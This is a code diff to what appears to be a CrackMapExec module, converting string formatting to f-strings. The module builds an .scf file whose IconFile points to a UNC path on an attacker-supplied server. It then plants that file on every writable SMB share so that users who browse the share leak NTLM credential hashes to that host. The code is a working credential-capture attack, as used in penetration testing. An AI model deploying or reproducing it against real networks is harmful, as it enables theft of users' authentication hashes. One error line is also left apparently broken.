@@ -31,39 +31,38 @@ class CMEModule:
         if 'NAME' not in module_options:
              context.log.error('NAME option is required!')
              exit(1)
-  
+
         if not self.cleanup and 'SERVER' not in module_options:
             context.log.error('SERVER option is required!')
             exit(1)
- 
+
         self.scf_name = module_options['NAME']
-        self.scf_path = '/tmp/{}.scf'.format(self.scf_name)
-        self.file_path = ntpath.join('\\', '{}.scf'.format(self.scf_name))
-  
+        self.scf_path = f'/tmp/{self.scf_name}.scf'
+        self.file_path = ntpath.join('\\', f'{self.scf_name}.scf')
+
         if not self.cleanup:
             self.server = module_options['SERVER']
-            scuf = open(self.scf_path, 'a');
-            scuf.write("[Shell]" + '\n');
-            scuf.write("Command=2" + '\n');
-            scuf.write("IconFile=" + '\\\\{}\\share\\icon.ico'.format(self.server) + '\n');
-            scuf.close();
+            with open(self.scf_path, 'a') as scuf:
+                scuf.write("[Shell]" + '\n');
+                scuf.write("Command=2" + '\n');
+                scuf.write("IconFile=" + f'\\\\{self.server}\\share\\icon.ico' + '\n');
 
     def on_login(self, context, connection):
         shares = connection.shares()
         for share in shares:
             if 'WRITE' in share['access'] and share['name'] not in ['C$', 'ADMIN$']:
                 #print share
-                context.log.success('Found writable share: {}'.format(share['name']))
+                context.log.success(f"Found writable share: {share['name']}")
                 if not self.cleanup:
                     with open(self.scf_path, 'rb') as scf:
                         try:
                             connection.conn.putFile(share['name'], self.file_path, scf.read)
-                            context.log.success('Created SCF file on the {} share'.format(share['name']))
+                            context.log.success(f"Created SCF file on the {share['name']} share")
                         except Exception as e:
                             context.log.error('Error writing SCF file to share {}: {}'.format(share['name']))
                 else:
                     try:
                         connection.conn.deleteFile(share['name'], self.file_path)
-                        context.log.success('Deleted SCF file on the {} share'.format(share['name']))
+                        context.log.success(f"Deleted SCF file on the {share['name']} share")
                     except Exception as e:
-                        context.log.error('Error deleting SCF file on share {}: {}'.format(share['name'], e))
+                        context.log.error(f"Error deleting SCF file on share {share['name']}: {e}")
